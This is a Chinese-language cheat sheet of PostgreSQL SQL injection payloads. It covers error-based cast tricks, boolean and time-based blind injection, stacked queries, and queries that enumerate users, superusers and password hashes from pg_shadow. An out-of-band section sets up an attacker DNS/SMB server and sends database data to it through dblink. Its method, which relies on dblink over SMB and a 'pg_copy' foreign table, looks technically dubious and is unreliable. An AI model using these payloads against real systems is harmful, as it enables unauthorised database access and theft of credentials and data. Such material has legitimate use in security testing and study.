## 报错注入

```sql
select * from tbuser where id=1 and 7778=cast((select version())::text as numeric)

,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)

' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
```

PostgreSQL XML helpers
```sql
select query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row

select database_to_xml(true,true,''); -- dump the current database to XML
select database_to_xmlschema(true,true,''); -- dump the current db to an XML schema
```

## 盲注

布尔盲注
```sql
判断数据库版本是否是PostgreSQL
' and substr(version(),1,10) = 'PostgreSQL' and '1  -> OK
' and substr(version(),1,10) = 'PostgreXXX' and '1  -> KO

and (select count(*) from pg_catalog.pg_tables)>0  //判断是否是PostgreSQL数据库
and (select count(*) from public.users)>0  //判断是否存在users表
id=1 and length((select current_database()))=8  //判断当前数据库名的长度是否是8
id=1 and ascii(substr((select current_database()),1,1))=112  //判断当前数据库名的第一个字母是否是p
```

时间延迟
```sql
基于时间
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))

基于数据库转储时间
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1

基于表转储时间
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1

基于列转储时间
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1

AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```

## OOB盲注
通过利用PostgreSQL的一些扩展模块，如dblink，postgres_fdw，pg_copy等，来创建DNS查询或读取SMB共享域名，从而将数据传输到攻击者的服务器。这种盲注的条件比较苛刻，需要能够堆叠语句，且当前用户必须有足够的权限

首先，我们需要在我们的服务器上创建一个DNS服务器和一个SMB服务器，用于接收数据。我们可以使用dnschef和impacket等工具来实现。例如，我们可以在我们的服务器上运行以下命令：

```bash
dnschef --fakeip 192.168.1.100 --interface eth0
smbserver.py -smb2support share /tmp
```

这样，我们就在我们的服务器上创建了一个DNS服务器，用于解析任意域名为192.168.1.100，和一个SMB服务器，用于共享/tmp目录

然后，我们需要在目标数据库上创建一个外部服务器，用于连接我们的服务器。我们可以使用dblink或postgres_fdw等模块来实现。例如，我们可以输入以下语句：

```sql
id=1; create extension dblink; select dblink_connect('myserver','host=192.168.1.100 port=445 user=guest password=guest dbname=share')
```

这样，我们就在目标数据库上创建了一个外部服务器，名为myserver，用于连接我们的服务器的SMB共享

最后，我们需要在目标数据库上创建一个外部表，用于读取或写入我们的服务器的文件。我们可以使用pg_copy或postgres_fdw等模块来实现

```sql
id=1; create extension pg_copy; create foreign table mytable (data text) server myserver options (filename 'data.txt', format 'text'); insert into mytable select current_user
```

这样，我们就在目标数据库上创建了一个外部表，名为mytable，用于读取或写入我们的服务器的data.txt文件

我们还向这个表中插入了当前用户的信息

我们可以在我们的服务器上查看这个文件的内容

```bash
cat /tmp/data.txt
dbuser
```

通过这种方法，我们可以逐步获取数据库的结构和内容，例如，我们可以用length()和substr()函数，结合ASCII码，来获取数据库名、表名、字段名和字段内容。例如，我们可以输入以下语句：

```sql
id=1; insert into mytable select current_database()
```

## 堆叠查询

```sql
http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--
```

## 查询语句

```sql
/?whatever=1;(select 1 from pg_sleep(5))
/?whatever=1||(select 1 from pg_sleep(5))
```

查看版本
```sql
SELECT version()
```

当前用户
```sql
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
```

列出用户
```sql
SELECT usename FROM pg_user
```

列出密码HASH
```sql
SELECT usename, passwd FROM pg_shadow
```

列出数据库管理员账户
```sql
SELECT usename FROM pg_user WHERE usesuper IS TRUE
```

列出表的权限
```sql
SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
```

检查当前用户是否是超级用户
```sql
SHOW is_superuser;
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

获取数据库名称
```sql
SELECT current_database()
```

列出数据库
```sql
SELECT datname FROM pg_database
```

表
```sql
SELECT table_name FROM information_schema.tables
```

列
```sql
SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
```
